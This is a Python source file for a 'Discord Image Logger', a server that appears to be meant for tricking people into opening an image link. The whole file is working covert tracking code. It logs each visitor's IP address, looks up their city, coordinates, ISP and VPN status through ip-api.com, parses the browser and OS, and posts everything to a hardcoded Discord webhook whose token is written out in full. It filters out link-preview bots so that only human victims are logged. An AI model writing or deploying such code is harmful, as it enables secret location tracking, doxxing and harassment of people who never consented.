# Discord Image Logger
# By DeKrypt (mirrored and fixed for Vercel)

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests, httpagentparser, html

# CONFIG
WEBHOOK = "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX"
DEFAULT_IMAGE = "https://notepad-plus-plus.org/assets/images/notepad4ever.png"
USERNAME = "Image Logger"
COLOR = 0x00FFFF
BLACKLISTED_IPS = ("27", "104", "143", "164")

# OPTIONS
OPTIONS = {
    "crashBrowser": False,      # Keep False
    "accurateLocation": True,   # Turned True
    "messageDo": True,          # Show message
    "richMessage": True,
    "vpnCheck": True,           # Enable VPN check
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": True             # Enable anti-bot
}

def botCheck(ip, user_agent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif user_agent.startswith("TelegramBot"):
        return "Telegram"
    return None

def reportError(error):
    requests.post(WEBHOOK, json={
        "username": USERNAME,
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": COLOR,
            "description": f"An error occurred while trying to log an IP!\n\n```\n{error}\n```"
        }]
    })

def makeReport(ip, user_agent, image_url=None, endpoint="N/A"):
    # Skip blacklisted IPs
    if ip.startswith(BLACKLISTED_IPS):
        return

    # Check bot
    bot = botCheck(ip, user_agent)
    if bot and OPTIONS["linkAlerts"]:
        requests.post(WEBHOOK, json={
            "username": USERNAME,
            "content": "",
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "color": COLOR,
                "description": f"An **Image Logging** link was sent in a chat!\nEndpoint: `{endpoint}`\nIP: `{ip}`\nPlatform: {bot}",
                "image": {"url": image_url or DEFAULT_IMAGE}
            }]
        })
        return

    # Fetch IP info for all ranges
    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except Exception:
        ip_info = {
            "query": ip,
            "isp": "Unknown",
            "as": "Unknown",
            "country": "Unknown",
            "regionName": "Unknown",
            "city": "Unknown",
            "lat": "Unknown",
            "lon": "Unknown",
            "timezone": "Unknown",
            "mobile": "Unknown",
            "proxy": False,
            "hosting": False
        }

    os_name, browser = httpagentparser.simple_detect(user_agent)

    embed = {
        "username": USERNAME,
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger IP Logged",
            "color": COLOR,
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** {endpoint}

**IP Info:**
> **IP:** {ip_info.get('query')}
> **Provider:** {ip_info.get('isp')}
> **ASN:** {ip_info.get('as')}
> **Country:** {ip_info.get('country')}
> **Region:** {ip_info.get('regionName')}
> **City:** {ip_info.get('city')}
> **Coords:** {ip_info.get('lat')}, {ip_info.get('lon')}
> **Timezone:** {ip_info.get('timezone')}
> **Mobile:** {ip_info.get('mobile')}
> **VPN:** {ip_info.get('proxy')}
> **Bot:** {ip_info.get('hosting')}

**PC Info:**
> **OS:** {os_name}
> **Browser:** {browser}

**User Agent:**
{html.escape(user_agent)}
""",
            "image": {"url": image_url or DEFAULT_IMAGE}
        }]
    }

    try:
        requests.post(WEBHOOK, json=embed)
    except Exception as e:
        reportError(e)


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            query = parse.urlparse(self.path).query
            params = parse.parse_qs(query)
            img_url = params.get("url", [DEFAULT_IMAGE])[0]

            user_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')

            makeReport(user_ip, user_agent, image_url=img_url, endpoint=self.path)

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f'<img src="{img_url}" alt="Image">'.encode())
        except Exception as e:
            reportError(e)
            self.send_response(500)
            self.end_headers()


def run_server():
    port = 8080
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"Discord Image Logger running on port {port}")
    server.serve_forever()


if __name__ == "__main__":
    run_server()
